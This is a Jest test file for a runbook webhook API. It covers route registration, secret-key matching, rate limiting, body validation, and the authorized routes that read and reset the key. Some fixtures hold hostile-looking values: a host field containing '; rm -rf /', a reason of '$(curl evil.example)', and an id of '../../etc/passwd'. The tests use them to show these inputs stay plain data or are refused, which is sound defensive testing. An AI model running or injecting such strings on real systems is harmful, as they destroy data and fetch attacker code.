import fs from "fs";
import path from "path";
import RunbookWebhookAPI, {
  isRunbookWebhookKeyMatch,
} from "../../../FeatureSet/Runbook/API/RunbookWebhook";
import CommonAPI from "Common/Server/API/CommonAPI";
import UserMiddleware from "Common/Server/Middleware/UserAuthorization";
import RunbookExecutionService from "Common/Server/Services/RunbookExecutionService";
import RunbookService, {
  Service as RunbookServiceClass,
} from "Common/Server/Services/RunbookService";
import {
  ExpressRequest,
  ExpressResponse,
  NextFunction,
} from "Common/Server/Utils/Express";
import Response from "Common/Server/Utils/Response";
import RunbookStarter, {
  RunbookStartRefusal,
  RunbookStartRequest,
  RunbookStartResult,
} from "Common/Server/Utils/Runbook/RunbookStarter";
import RunbookTriggerAccess, {
  RUNBOOK_WEBHOOK_URL_REFUSED_MESSAGE,
} from "Common/Server/Utils/Runbook/RunbookTriggerAccess";
import RunbookWebhookRateLimit, {
  RunbookWebhookRateLimitDecision,
  RunbookWebhookRateLimitOutcome,
} from "Common/Server/Utils/Runbook/RunbookWebhookRateLimit";
import Runbook from "Common/Models/DatabaseModels/Runbook";
import RunbookExecution from "Common/Models/DatabaseModels/RunbookExecution";
import DatabaseCommonInteractionProps from "Common/Types/BaseDatabase/DatabaseCommonInteractionProps";
import Dictionary from "Common/Types/Dictionary";
import BadDataException from "Common/Types/Exception/BadDataException";
import Exception from "Common/Types/Exception/Exception";
import ForbiddenException from "Common/Types/Exception/ForbiddenException";
import NotAuthenticatedException from "Common/Types/Exception/NotAuthenticatedException";
import NotAuthorizedException from "Common/Types/Exception/NotAuthorizedException";
import NotFoundException from "Common/Types/Exception/NotFoundException";
import PayloadTooLargeException from "Common/Types/Exception/PayloadTooLargeException";
import ProjectBlockedException from "Common/Types/Exception/ProjectBlockedException";
import ServiceUnavailableException from "Common/Types/Exception/ServiceUnavailableException";
import TooManyRequestsException from "Common/Types/Exception/TooManyRequestsException";
import { JSONObject } from "Common/Types/JSON";
import ObjectID from "Common/Types/ObjectID";
import PositiveNumber from "Common/Types/PositiveNumber";
import RunbookExecutionStatus from "Common/Types/Runbook/RunbookExecutionStatus";
import RunbookTriggerType from "Common/Types/Runbook/RunbookTriggerType";
import {
  RUNBOOK_WEBHOOK_MAX_ACTIVE_RUNS,
  RUNBOOK_WEBHOOK_ROUTE,
  RUNBOOK_WEBHOOK_SECRET_RESET_ROUTE,
  RUNBOOK_WEBHOOK_SECRET_ROUTE,
  RunbookWebhookMessages,
} from "Common/Types/Runbook/RunbookWebhook";
import UserType from "Common/Types/UserType";
import {
  afterEach,
  beforeAll,
  beforeEach,
  describe,
  expect,
  test,
} from "@jest/globals";

/*
 * A RUNBOOK'S WEBHOOK URL, route by route.
 *
 * The load-bearing assertion of every refusal is that RunbookStarter.start
 * was never called: an error alone would not prove nothing ran. And of
 * every accepted call, that the body reached the run as its inputs,
 * exactly as sent, recorded as the Webhook's.
 */

type RouterFunction = (
  req: ExpressRequest,
  res: ExpressResponse,
  next: NextFunction,
) => void | Promise<void>;

type MockRoute = {
  method: string;
  uri: string;
  handlers: Array<RouterFunction>;
};

const mockRoutes: Array<MockRoute> = [];

const register: (
  method: string,
) => (uri: string, ...handlers: Array<RouterFunction>) => void = (
  method: string,
) => {
  return (uri: string, ...handlers: Array<RouterFunction>): void => {
    mockRoutes.push({ method: method.toUpperCase(), uri, handlers });
  };
};

jest.mock("Common/Server/Utils/Express", () => {
  const actual: Record<string, unknown> = jest.requireActual(
    "Common/Server/Utils/Express",
  ) as Record<string, unknown>;

  return {
    ...actual,
    __esModule: true,
    default: {
      ...((actual["default"] as Record<string, unknown>) || {}),
      getRouter: (): Record<string, unknown> => {
        return {
          get: register("get"),
          post: register("post"),
          put: register("put"),
          delete: register("delete"),
        };
      },
    },
  };
});

jest.mock("Common/Server/Utils/Response", () => {
  return {
    __esModule: true,
    default: {
      sendJsonObjectResponse: jest.fn(),
      sendErrorResponse: jest.fn(),
    },
  };
});

const PROJECT_ID: ObjectID = new ObjectID(
  "11111111-1111-4111-8111-1111111111f1",
);
const RUNBOOK_ID: ObjectID = new ObjectID(
  "22222222-2222-4222-8222-2222222222f2",
);
const EXECUTION_ID: ObjectID = new ObjectID(
  "33333333-3333-4333-8333-3333333333f3",
);
const SECRET_KEY: string = RunbookServiceClass.generateWebhookSecretKey();

const ALLOWED: RunbookWebhookRateLimitDecision = {
  outcome: RunbookWebhookRateLimitOutcome.Allowed,
};

interface CallResult {
  error: Exception | undefined;
  body: JSONObject | undefined;
  options: { statusCode?: { toNumber: () => number } } | undefined;
  headers: Dictionary<string>;
}

function findRoute(method: string, uri: string): MockRoute {
  const route: MockRoute | undefined = mockRoutes.find((item: MockRoute) => {
    return item.method === method && item.uri === uri;
  });

  if (!route) {
    throw new Error(`${method} ${uri} was never registered`);
  }

  return route;
}

async function call(data: {
  method?: string;
  uri?: string;
  params?: Dictionary<string>;
  body?: unknown;
  rawBody?: string | undefined;
}): Promise<CallResult> {
  const headers: Dictionary<string> = {};
  const req: ExpressRequest = {
    params: data.params || {
      runbookId: RUNBOOK_ID.toString(),
      secretKey: SECRET_KEY,
    },
    query: {},
    body: data.body,
    rawBody:
      data.rawBody !== undefined
        ? data.rawBody
        : data.body === undefined
          ? undefined
          : JSON.stringify(data.body),
    headers: {},
    socket: { remoteAddress: "203.0.113.7" },
  } as unknown as ExpressRequest;
  const res: ExpressResponse = {
    setHeader: (name: string, value: string): void => {
      headers[name] = value;
    },
  } as unknown as ExpressResponse;

  let error: Exception | undefined = undefined;
  const next: NextFunction = ((err: Exception): void => {
    error = err;
  }) as unknown as NextFunction;

  (Response.sendJsonObjectResponse as unknown as jest.Mock).mockClear();

  const route: MockRoute = findRoute(
    data.method || "POST",
    data.uri || RUNBOOK_WEBHOOK_ROUTE,
  );
  // The handler is the route's last function; the ones before are middleware.
  await route.handlers[route.handlers.length - 1]!(req, res, next);

  const sent: Array<unknown> | undefined = (
    Response.sendJsonObjectResponse as unknown as jest.Mock
  ).mock.calls[0];

  return {
    error,
    body: sent ? (sent[2] as JSONObject) : undefined,
    options: sent ? (sent[3] as CallResult["options"]) : undefined,
    headers,
  };
}

/*
 * Fixture overrides may set a column to undefined on purpose (a runbook
 * with no key is a case under test), which Partial<Model> forbids under
 * exactOptionalPropertyTypes.
 */
type Loose<TModel> = { [K in keyof TModel]?: TModel[K] | undefined };

function runbook(overrides: Loose<Runbook> = {}): Runbook {
  const item: Runbook = new Runbook();

  Object.assign(item, {
    _id: RUNBOOK_ID.toString(),
    projectId: PROJECT_ID,
    name: "Clear the disk",
    isEnabled: true,
    isWebhookEnabled: true,
    webhookSecretKey: SECRET_KEY,
    steps: [{ id: "a", order: 1, type: "Bash", title: "Clean", config: {} }],
    ...overrides,
  });

  return item;
}

let findRunbook: jest.SpyInstance;
let countActive: jest.SpyInstance;
let start: jest.SpyInstance;
let addressLimit: jest.SpyInstance;
let runbookLimit: jest.SpyInstance;

beforeAll(() => {
  mockRoutes.length = 0;
  new RunbookWebhookAPI();
});

beforeEach(() => {
  findRunbook = jest
    .spyOn(RunbookService, "findOneById")
    .mockResolvedValue(runbook() as never);
  countActive = jest
    .spyOn(RunbookExecutionService, "countBy")
    .mockResolvedValue(new PositiveNumber(0) as never);
  start = jest.spyOn(RunbookStarter, "start").mockImplementation((async (
    request: RunbookStartRequest,
  ): Promise<RunbookStartResult> => {
    const execution: RunbookExecution = new RunbookExecution();
    execution._id = EXECUTION_ID.toString();
    execution.triggerType = request.trigger;
    return { isStarted: true, execution };
  }) as never);
  addressLimit = jest
    .spyOn(RunbookWebhookRateLimit, "consumeForAddress")
    .mockResolvedValue(ALLOWED);
  runbookLimit = jest
    .spyOn(RunbookWebhookRateLimit, "consumeForRunbook")
    .mockResolvedValue(ALLOWED);
});

afterEach(() => {
  jest.restoreAllMocks();
});

describe("the routes", () => {
  test("POST and GET at the webhook URL, without a sign-in; the key routes behind it", () => {
    const webhookPost: MockRoute = findRoute("POST", RUNBOOK_WEBHOOK_ROUTE);
    const webhookGet: MockRoute = findRoute("GET", RUNBOOK_WEBHOOK_ROUTE);

    expect(webhookPost.handlers).toHaveLength(1);
    expect(webhookGet.handlers).toHaveLength(1);

    for (const uri of [
      RUNBOOK_WEBHOOK_SECRET_ROUTE,
      RUNBOOK_WEBHOOK_SECRET_RESET_ROUTE,
    ]) {
      const route: MockRoute = findRoute("POST", uri);

      expect(route.handlers[0]).toBe(UserMiddleware.getUserMiddleware);
    }

    expect(
      mockRoutes.map((route: MockRoute) => {
        return `${route.method} ${route.uri}`;
      }),
    ).toEqual([
      "POST /webhook/:runbookId/:secretKey",
      "GET /webhook/:runbookId/:secretKey",
      "POST /webhook-secret/:runbookId",
      "POST /webhook-secret/:runbookId/reset",
    ]);
  });
});

describe("a call that starts a run", () => {
  test("hands the JSON body to the run as its inputs, recorded as the Webhook's with the caller's address", async () => {
    const body: JSONObject = {
      host: "web-1; rm -rf /",
      reason: "$(curl evil.example)",
      labels: { team: "payments" },
    };

    const result: CallResult = await call({ body });

    expect(result.error).toBeUndefined();
    expect(result.body).toEqual({
      runbookExecutionId: EXECUTION_ID.toString(),
      status: RunbookExecutionStatus.Scheduled,
    });
    expect(start).toHaveBeenCalledTimes(1);

    const request: RunbookStartRequest = start.mock
      .calls[0]![0] as RunbookStartRequest;

    expect(request.trigger).toBe(RunbookTriggerType.Webhook);
    expect(request.runbookId.toString()).toBe(RUNBOOK_ID.toString());
    expect(request.projectId.toString()).toBe(PROJECT_ID.toString());
    // Exactly as sent: data for the steps, nothing interpreted.
    expect(request.inputs).toEqual(body);
    expect(request.triggerDetails).toEqual({ callerIp: "203.0.113.7" });
    expect(request.triggeredByUserId).toBeUndefined();
    // The runbook read to check the key is handed on, not read again.
    expect(request.runbook?._id).toBe(RUNBOOK_ID.toString());
  });

  test("takes no body as no inputs", async () => {
    const result: CallResult = await call({ body: undefined });

    expect(result.error).toBeUndefined();
    expect((start.mock.calls[0]![0] as RunbookStartRequest).inputs).toEqual({});
  });

  test("counts against the caller's address first, and against the runbook only once it will start a run", async () => {
    await call({ body: {} });

    expect(addressLimit).toHaveBeenCalledTimes(1);
    expect(runbookLimit).toHaveBeenCalledTimes(1);
    expect((runbookLimit.mock.calls[0]![0] as ObjectID).toString()).toBe(
      RUNBOOK_ID.toString(),
    );
  });

  test("counts the runbook's active runs that its webhook started", async () => {
    await call({ body: {} });

    const query: Record<string, unknown> = (
      countActive.mock.calls[0]![0] as { query: Record<string, unknown> }
    ).query;

    expect(String(query["runbookId"])).toBe(RUNBOOK_ID.toString());
    expect(query["triggerType"]).toBe(RunbookTriggerType.Webhook);
    expect(query["status"]).toBeDefined();
  });
});

describe("a call that starts nothing", () => {
  async function expectRefused(
    result: CallResult,
    type: { new (...args: Array<never>): Exception },
    message?: string,
  ): Promise<void> {
    expect(result.error).toBeInstanceOf(type);

    if (message !== undefined) {
      expect(result.error?.message).toBe(message);
    }

    expect(start).not.toHaveBeenCalled();
    expect(result.body).toBeUndefined();
  }

  test("a wrong key, a missing runbook, a runbook with no key and an id that is not one are all the same 404", async () => {
    await expectRefused(
      await call({
        params: {
          runbookId: RUNBOOK_ID.toString(),
          secretKey: RunbookServiceClass.generateWebhookSecretKey(),
        },
      }),
      NotFoundException,
      RunbookWebhookMessages.notFound,
    );

    findRunbook.mockResolvedValue(null as never);
    await expectRefused(
      await call({}),
      NotFoundException,
      RunbookWebhookMessages.notFound,
    );

    findRunbook.mockResolvedValue(
      runbook({ webhookSecretKey: undefined }) as never,
    );
    await expectRefused(
      await call({}),
      NotFoundException,
      RunbookWebhookMessages.notFound,
    );

    findRunbook.mockClear();
    await expectRefused(
      await call({ params: { runbookId: "not-an-id", secretKey: SECRET_KEY } }),
      NotFoundException,
      RunbookWebhookMessages.notFound,
    );
    // An id that is not one is never looked up.
    expect(findRunbook).not.toHaveBeenCalled();
  });

  test("a key that is the right one with a character more or less is wrong", async () => {
    const otherFirst: string = SECRET_KEY.startsWith("a") ? "b" : "a";

    for (const secretKey of [
      SECRET_KEY.slice(0, -1),
      `${SECRET_KEY}a`,
      `${otherFirst}${SECRET_KEY.slice(1)}`,
      "",
    ]) {
      await expectRefused(
        await call({ params: { runbookId: RUNBOOK_ID.toString(), secretKey } }),
        NotFoundException,
      );
    }
  });

  test("a wrong key does not count against the runbook's budget", async () => {
    await call({
      params: {
        runbookId: RUNBOOK_ID.toString(),
        secretKey: RunbookServiceClass.generateWebhookSecretKey(),
      },
    });

    expect(addressLimit).toHaveBeenCalledTimes(1);
    expect(runbookLimit).not.toHaveBeenCalled();
  });

  test("the webhook turned off: 403, saying how to turn it on", async () => {
    findRunbook.mockResolvedValue(
      runbook({ isWebhookEnabled: false }) as never,
    );

    await expectRefused(
      await call({ body: {} }),
      ForbiddenException,
      RunbookWebhookMessages.webhookOff,
    );
  });

  test("the runbook turned off: 403, saying how to turn it on", async () => {
    findRunbook.mockResolvedValue(runbook({ isEnabled: false }) as never);

    await expectRefused(
      await call({ body: {} }),
      ForbiddenException,
      RunbookWebhookMessages.runbookOff,
    );
  });

  test("a body that is not a JSON object, too large, too deep or holding a NUL is refused", async () => {
    await expectRefused(
      await call({ body: [1, 2, 3] }),
      BadDataException,
      RunbookWebhookMessages.bodyNotAnObject,
    );
    await expectRefused(
      await call({ body: { a: 1 }, rawBody: "x".repeat(64 * 1024 + 1) }),
      PayloadTooLargeException,
      RunbookWebhookMessages.bodyTooLarge,
    );

    let deep: JSONObject = { leaf: 1 };

    for (let i: number = 0; i < 40; i++) {
      deep = { child: deep };
    }

    await expectRefused(
      await call({ body: deep }),
      BadDataException,
      RunbookWebhookMessages.bodyTooDeep,
    );
    await expectRefused(
      await call({ body: { host: `web${String.fromCharCode(0)}` } }),
      BadDataException,
      RunbookWebhookMessages.nulCharacter,
    );
    expect(runbookLimit).not.toHaveBeenCalled();
  });

  test("too many calls from one address: 429 with when to try again, before the runbook is looked up", async () => {
    addressLimit.mockResolvedValue({
      outcome: RunbookWebhookRateLimitOutcome.RateLimited,
      retryAfterSeconds: 17,
    });

    const result: CallResult = await call({ body: {} });

    await expectRefused(
      result,
      TooManyRequestsException,
      RunbookWebhookMessages.tooManyCallsFromAddress,
    );
    expect(result.headers["Retry-After"]).toBe("17");
    expect(findRunbook).not.toHaveBeenCalled();
  });

  test("too many runs this minute: 429 with when to try again", async () => {
    runbookLimit.mockResolvedValue({
      outcome: RunbookWebhookRateLimitOutcome.RateLimited,
      retryAfterSeconds: 42,
    });

    const result: CallResult = await call({ body: {} });

    await expectRefused(
      result,
      TooManyRequestsException,
      RunbookWebhookMessages.rateLimited,
    );
    expect(result.headers["Retry-After"]).toBe("42");
  });

  test("a counter that cannot count: 503, nothing started", async () => {
    addressLimit.mockResolvedValue({
      outcome: RunbookWebhookRateLimitOutcome.CounterUnavailable,
    });

    await expectRefused(
      await call({ body: {} }),
      ServiceUnavailableException,
      RunbookWebhookMessages.counterUnavailable,
    );
  });

  test(`${RUNBOOK_WEBHOOK_MAX_ACTIVE_RUNS} runs it started still going: 429`, async () => {
    countActive.mockResolvedValue(
      new PositiveNumber(RUNBOOK_WEBHOOK_MAX_ACTIVE_RUNS) as never,
    );

    await expectRefused(
      await call({ body: {} }),
      TooManyRequestsException,
      RunbookWebhookMessages.tooManyActiveRuns,
    );

    countActive.mockResolvedValue(
      new PositiveNumber(RUNBOOK_WEBHOOK_MAX_ACTIVE_RUNS - 1) as never,
    );
    start.mockClear();

    expect((await call({ body: {} })).error).toBeUndefined();
    expect(start).toHaveBeenCalledTimes(1);
  });

  test("what the start path refuses is answered in the webhook's words", async () => {
    const cases: Array<
      [
        RunbookStartRefusal,
        { new (...args: Array<never>): Exception },
        string | undefined,
      ]
    > = [
      [
        RunbookStartRefusal.NoSteps,
        BadDataException,
        RunbookWebhookMessages.noSteps,
      ],
      [
        RunbookStartRefusal.TurnedOff,
        ForbiddenException,
        RunbookWebhookMessages.runbookOff,
      ],
      [RunbookStartRefusal.ProjectBlocked, ProjectBlockedException, undefined],
      [
        RunbookStartRefusal.NotFound,
        NotFoundException,
        RunbookWebhookMessages.notFound,
      ],
      [
        RunbookStartRefusal.NotQueued,
        ServiceUnavailableException,
        RunbookWebhookMessages.counterUnavailable,
      ],
    ];

    for (const [refusal, type, message] of cases) {
      start.mockResolvedValue({ isStarted: false, refusal } as never);

      const result: CallResult = await call({ body: {} });

      expect(result.error).toBeInstanceOf(type);

      if (message) {
        expect(result.error?.message).toBe(message);
      }
    }
  });

  test("a GET starts nothing and looks nothing up: 405, Allow: POST, and how to call it", async () => {
    const result: CallResult = await call({ method: "GET" });

    expect(result.error).toBeUndefined();
    expect(result.body).toEqual({
      message: RunbookWebhookMessages.getNotAllowed,
    });
    expect(result.options?.statusCode?.toNumber()).toBe(405);
    expect(result.headers["Allow"]).toBe("POST");
    expect(findRunbook).not.toHaveBeenCalled();
    expect(start).not.toHaveBeenCalled();
    expect(addressLimit).not.toHaveBeenCalled();
  });
});

describe("comparing the key", () => {
  test("matches only the runbook's own key, of the shape the server makes", () => {
    expect(isRunbookWebhookKeyMatch(SECRET_KEY, SECRET_KEY)).toBe(true);
    expect(isRunbookWebhookKeyMatch(SECRET_KEY, `${SECRET_KEY} `)).toBe(false);
    expect(isRunbookWebhookKeyMatch(SECRET_KEY, undefined)).toBe(false);
    expect(isRunbookWebhookKeyMatch(undefined, undefined)).toBe(false);
    expect(isRunbookWebhookKeyMatch(null, "")).toBe(false);
    expect(isRunbookWebhookKeyMatch("", "")).toBe(false);
    // A stored value that is not a key the server makes never matches.
    expect(isRunbookWebhookKeyMatch("short", "short")).toBe(false);
  });

  test("compares digests in constant time, never the strings", () => {
    const source: string = fs.readFileSync(
      path.join(__dirname, "../../../FeatureSet/Runbook/API/RunbookWebhook.ts"),
      "utf8",
    );

    expect(source).toContain(
      "crypto.timingSafeEqual(storedDigest, givenDigest)",
    );
    expect(source).toContain('createHash("sha256")');
  });
});

describe("the key routes", () => {
  function signedIn(): DatabaseCommonInteractionProps {
    return {
      tenantId: PROJECT_ID,
      userId: ObjectID.generate(),
      userType: UserType.User,
      userTenantAccessPermission: {},
    };
  }

  let manage: jest.SpyInstance;

  beforeEach(() => {
    jest
      .spyOn(CommonAPI, "getDatabaseCommonInteractionProps")
      .mockResolvedValue(signedIn());
    jest
      .spyOn(CommonAPI, "assertAuthenticatedProjectPrincipal")
      .mockReturnValue(PROJECT_ID);
    manage = jest
      .spyOn(RunbookTriggerAccess, "assertMayManageWebhook")
      .mockResolvedValue(undefined);
  });

  test("read the key for someone who may manage the webhook, never cached", async () => {
    const result: CallResult = await call({
      uri: RUNBOOK_WEBHOOK_SECRET_ROUTE,
      params: { runbookId: RUNBOOK_ID.toString() },
    });

    expect(result.error).toBeUndefined();
    expect(result.body).toEqual({
      secretKey: SECRET_KEY,
      isWebhookEnabled: true,
    });
    expect(result.headers["Cache-Control"]).toBe("no-store");
    expect(
      (
        manage.mock.calls[0]![0] as { runbookId: ObjectID }
      ).runbookId.toString(),
    ).toBe(RUNBOOK_ID.toString());
  });

  test("give a webhook that is on but has no key one, so there is always a URL to show", async () => {
    findRunbook.mockResolvedValue(
      runbook({ webhookSecretKey: undefined }) as never,
    );
    const ensure: jest.SpyInstance = jest
      .spyOn(RunbookService, "ensureWebhookSecretKey")
      .mockResolvedValue("k".repeat(43));

    const result: CallResult = await call({
      uri: RUNBOOK_WEBHOOK_SECRET_ROUTE,
      params: { runbookId: RUNBOOK_ID.toString() },
    });

    expect(ensure).toHaveBeenCalledTimes(1);
    expect(result.body?.["secretKey"]).toBe("k".repeat(43));
  });

  test("give a webhook that is off and has no key none", async () => {
    findRunbook.mockResolvedValue(
      runbook({
        webhookSecretKey: undefined,
        isWebhookEnabled: false,
      }) as never,
    );
    const ensure: jest.SpyInstance = jest.spyOn(
      RunbookService,
      "ensureWebhookSecretKey",
    );

    const result: CallResult = await call({
      uri: RUNBOOK_WEBHOOK_SECRET_ROUTE,
      params: { runbookId: RUNBOOK_ID.toString() },
    });

    expect(ensure).not.toHaveBeenCalled();
    expect(result.body).toEqual({ secretKey: null, isWebhookEnabled: false });
  });

  test("reset the key, answering with the new one", async () => {
    const reset: jest.SpyInstance = jest
      .spyOn(RunbookService, "resetWebhookSecretKey")
      .mockResolvedValue("n".repeat(43));

    const result: CallResult = await call({
      uri: RUNBOOK_WEBHOOK_SECRET_RESET_ROUTE,
      params: { runbookId: RUNBOOK_ID.toString() },
    });

    expect(result.error).toBeUndefined();
    expect(result.body).toEqual({ secretKey: "n".repeat(43) });
    expect(result.headers["Cache-Control"]).toBe("no-store");
    expect((reset.mock.calls[0]![0] as ObjectID).toString()).toBe(
      RUNBOOK_ID.toString(),
    );
  });

  test("answer someone who may not manage it with the refusal, and read or reset nothing", async () => {
    manage.mockRejectedValue(
      new NotAuthorizedException(RUNBOOK_WEBHOOK_URL_REFUSED_MESSAGE),
    );
    const reset: jest.SpyInstance = jest.spyOn(
      RunbookService,
      "resetWebhookSecretKey",
    );

    for (const uri of [
      RUNBOOK_WEBHOOK_SECRET_ROUTE,
      RUNBOOK_WEBHOOK_SECRET_RESET_ROUTE,
    ]) {
      findRunbook.mockClear();

      const result: CallResult = await call({
        uri,
        params: { runbookId: RUNBOOK_ID.toString() },
      });

      expect(result.error).toBeInstanceOf(NotAuthorizedException);
      expect(result.error?.message).toBe(RUNBOOK_WEBHOOK_URL_REFUSED_MESSAGE);
      expect(result.body).toBeUndefined();
      expect(findRunbook).not.toHaveBeenCalled();
    }

    expect(reset).not.toHaveBeenCalled();
  });

  test("answer a caller with no credentials as signed out, before anything else", async () => {
    (
      CommonAPI.assertAuthenticatedProjectPrincipal as unknown as jest.Mock
    ).mockImplementation(() => {
      throw new NotAuthenticatedException(
        CommonAPI.AUTHENTICATION_REQUIRED_MESSAGE,
      );
    });

    const result: CallResult = await call({
      uri: RUNBOOK_WEBHOOK_SECRET_ROUTE,
      params: { runbookId: RUNBOOK_ID.toString() },
    });

    expect(result.error).toBeInstanceOf(NotAuthenticatedException);
    expect(manage).not.toHaveBeenCalled();
  });

  test("answer an id that is not one as not found", async () => {
    const result: CallResult = await call({
      uri: RUNBOOK_WEBHOOK_SECRET_ROUTE,
      params: { runbookId: "../../etc/passwd" },
    });

    expect(result.error).toBeInstanceOf(NotFoundException);
    expect(manage).not.toHaveBeenCalled();
  });
});
